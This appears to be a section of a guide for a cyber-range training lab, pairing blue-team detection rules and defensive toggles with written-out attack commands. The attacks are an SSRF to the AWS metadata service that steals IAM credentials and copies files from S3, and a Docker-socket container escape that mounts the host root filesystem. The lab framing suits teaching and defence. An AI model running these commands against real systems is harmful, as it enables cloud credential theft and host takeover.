## 🛡️ 3. Blue Team SOC SIEM & Defense Modes

Switch to the **`🛡️ SOC SIEM`** tab in the top navigation to observe live detection alerts generated by your terminal commands:
* **Suricata IDS**: Detects Nmap SYN port sweeps (`RULE-1002`).
* **ModSecurity WAF**: Detects SQL injection and directory fuzzing (`RULE-3011`).
* **Fail2Ban**: Detects SSH brute force dictionary attacks (`RULE-2004`).
* **Zeek Network Monitor**: Detects anomalous outbound reverse TCP connections (`RULE-4001`).
* **Linux Auditd**: Detects `cap_setuid` privilege escalation (`RULE-5022`).
* **AWS CloudTrail**: Detects AWS STS credential requests via IMDS SSRF (`RULE-6001`).
* **Falco Container Runtime**: Detects physical root host mounting via `docker.sock` (`RULE-7001`).

### Blue Team Defensive Toggles:
* **Fail2Ban SSH Rate-Limiting**: Enable to automatically ban attacker IP after 3 failed password attempts.
* **ModSecurity WAF**: Enable to drop unescaped SQL injections and shell metacharacters.
* **Linux Auditd SUID Hardening**: Enable to block `cap_setuid` privilege escalation in the kernel.

## 📡 4. Live Packet Sniffer (`tcpdump`)

Stream live raw Ethernet/IP/TCP packets in your terminal:
```bash
# Stream live TCP traffic on tun0 interface
tcpdump -i tun0

# Stream with hex and ASCII payload dump
tcpdump -i tun0 -X

# Press Ctrl + C at any time to cleanly stop capturing
```

## ☁️ 5. Cloud & Container Tool Syntax

### AWS Cloud Metadata SSRF (Operation 11)
```bash
# Query AWS Instance Metadata Service (IMDS) via SSRF proxy
curl "http://192.168.1.42/api/v1/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ApexCloudRole"

# Verify stolen IAM Role identity
aws sts get-caller-identity

# Enumerate confidential corporate S3 buckets
aws s3 ls

# List contents of confidential backup bucket
aws s3 ls s3://apex-confidential-backups/

# Exfiltrate confidential cloud flag
aws s3 cp s3://apex-confidential-backups/cloud_flag.txt .
```

### Docker Socket Container Escape (Operation 12)
```bash
# Verify you are trapped inside a container namespace
cat /proc/1/cgroup

# Check Docker processes and socket
docker ps

# Break out of container by mounting host root filesystem
docker run -v /:/mnt/host alpine chroot /mnt/host

# Read physical host node flag
cat /mnt/host/root/docker_escape_flag.txt
```
